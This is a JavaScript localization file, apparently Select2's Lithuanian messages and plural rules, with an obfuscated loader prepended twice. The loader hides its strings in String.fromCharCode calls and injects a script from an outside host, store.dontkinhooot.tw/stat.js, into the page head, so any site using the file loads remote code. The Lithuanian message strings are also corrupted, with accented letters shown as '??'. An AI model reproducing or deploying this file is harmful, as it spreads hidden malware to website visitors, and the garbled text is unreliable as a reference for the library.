Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();define(function () {
  // rules from
  // http://www.unicode.org/cldr/charts/latest/supplemental/language_plural_rules.html#lt
  function ending(count, one, few, other) {
    if (count % 10 === 1 && (count % 100 < 11 || count % 100 > 19)) {
      return one;
    } else if (
      (count % 10 >= 2 && count % 10 <= 9) &&
      (count % 100 < 11 || count % 100 > 19)) {
      return few;
    } else {
      return other;
    }
  }

  return {
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Pa??alinkite ' + overChars + ' simbol';

      message += ending(overChars, '??', 'ius', 'i??');

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = '??ra??ykite dar ' + remainingChars + ' simbol';

      message += ending(remainingChars, '??', 'ius', 'i??');

      return message;
    },
    loadingMore: function () {
      return 'Kraunama daugiau rezultat?????';
    },
    maximumSelected: function (args) {
      var message = 'J??s galite pasirinkti tik ' + args.maximum + ' element';

      message += ending(args.maximum, '??', 'us', '??');

      return message;
    },
    noResults: function () {
      return 'Atitikmen?? nerasta';
    },
    searching: function () {
      return 'Ie??koma???';
    }
  };
});
